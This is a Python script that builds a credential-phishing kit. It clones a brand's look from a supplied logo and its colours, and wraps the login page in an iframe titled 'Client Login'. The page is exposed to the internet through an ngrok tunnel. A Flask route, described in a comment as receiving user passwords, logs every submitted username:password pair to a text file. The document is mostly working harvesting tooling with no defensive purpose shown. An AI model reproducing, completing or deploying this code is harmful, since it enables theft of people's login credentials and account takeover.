import requests
from flask import Flask, redirect, url_for, request, jsonify, render_template,make_response,send_file
import os
from pyngrok import ngrok
import time
from colorthief import ColorThief
import requests
import shutil

sitename=(input("Enter site name:\n"))
cwd=os.getcwd()

if not os.path.exists(f'{cwd}\\{sitename}'):
  os.mkdir(sitename)
  os.mkdir(f'{sitename}\\site')
  open(f'{sitename}\\setup.py','w').close()
  open(f'{sitename}\\site\\index.html','w').close()
  open(f'{sitename}\\main.py','w').close()
  open(f'{sitename}\\frame.html','w').close()
  open(f'{sitename}\\site\\script.js','w').close()
  open(f'{sitename}\\site\\style.css','w').close()
  open(f'{sitename}\\ups.txt','w').close()

if not os.path.exists('ups.txt'): open("ups.txt",'w').close()


### connect with ngrok
http_tunnel = ngrok.connect(5111)
address=(str(http_tunnel).split(" ")[1])
address=address.replace("http","https")
print(address)

## create setup file
with open("setuptemplate.txt",'r') as setuptemplate:
  setuppy=setuptemplate.read()
with open(sitename+"\\setup.py",'w') as setuptemplate:
  setuptemplate.write(setuppy)

## create script.js
with open("scripttemplate.js",'r') as scripttemp:
  scriptjs=scripttemp.read()
with open(sitename+"\\site\\script.js",'w') as scripttemp:
    scripttemp.write(scriptjs)

## edit js file
with open(sitename+"\\site\\script.js","r") as jsfile:
  jscode=jsfile.readlines()[0]
with open(sitename+"\\site\\script.js","r") as jsfile:
  fulljs=jsfile.read()
with open(sitename+"\\site\\script.js","w") as jsfile:
  newcode=fulljs.replace(jscode,f'let address = {address};')
  jsfile.write(newcode)

## create iframe code
with open(sitename+"/frame.html",'w') as framef:
    framef.write(r'''
<!DOCTYPE html>
<head>
</head>
<body style="margin:0";>
'''+'<iframe frameborder="0" height=900vh width=100% title="Client Login" src='+address+"></iframe>\n</body>")

## create style.css
with open("styletemplate.css",'r') as styletemp:
  stylecss=styletemp.read()
with open(sitename+"\\site\\style.css",'w') as styletemp:
    styletemp.write(stylecss)

## create index.html
with open ("indextemplate.html",'r') as itemp:
  itemphtml=itemp.read()
with open(sitename+"\\site\\index.html",'w') as itemp:
    itemp.write(itemphtml)

## create host.py
with open ("hosttemplate.py",'r') as hosttemp:
  hosttempdata =hosttemp.read()
with open(sitename+"/host.py",'w') as hosttemp:
    hosttemp.write(hosttempdata)

## get image source sve to logo.png
logosource=input("select:\n1. Local png file,\n2. online imagelink:\n")

if logosource == '1':
  logo = input("enter path\n")[1:-1]
  shutil.copy(logo, sitename+"\\site\\logo.png")


if logosource=='2':
  logo=input("Enter logo link:\n")
  img_data = requests.get(logo).content
  with open(sitename+"\\site\\logo.png", 'wb') as handler:
      handler.write(img_data)

## get pallete
color_thief = ColorThief(sitename+"\\site\\logo.png")
dominant_color = color_thief.get_color(quality=1)
palette = color_thief.get_palette(color_count=6)[0]
print(palette)

## save bg color in hex
def rgb_to_hex(rgb):
    return '%02x%02x%02x' % rgb
bgcolor=(rgb_to_hex(palette))
print(bgcolor)

## insert colors into index.html
with open(sitename+"\\site\\index.html","r") as mf:
  md=mf.read()
  md=md.replace('ffffff',bgcolor)
  md=md.replace("<title>Client Portal</title>",f'<title>{sitename}</title>')
with open(sitename+"\\site\\index.html","w") as mf:
  mf.write(md)

### run from this as host ##
'''
## init flask api
app = Flask(__name__)

## flsk routes
@app.route('/', methods=['GET'])
def sendhtml():
	return send_file(sitename+"/index.html")

@app.route('/style.css', methods=['GET'])
def sendcss():
	return send_file(sitename+"/style.css")

@app.route('/script.js', methods=['GET'])
def sendjs():
	return send_file(sitename+"/script.js")

@app.route('/logo.png', methods=['GET'])
def sendlogo():
  return send_file(sitename+"/logo.png")

## receive user passwords and save to ups.txt
@app.route('/up', methods=['GET'])
def query_strings():

    user,password = str(request.args['user']).split(':')
    print(f'user:{user} password:{password}')
    with open(sitename+"ups.txt",'a') as ups:
    	ups.write(request.args['user']+'\n')
    return jsonify({"password":password,"user":user})

## open https address of index.html 
#try:os.system(f'start {address[1:-1]}')
#except:pass

## open in iframe
cwd=os.getcwd()
os.system(f'start {cwd}\\{sitename}\\frame.html')

## run app on port 5111
app.run(host='0.0.0.0', port=5111,debug=False)

'''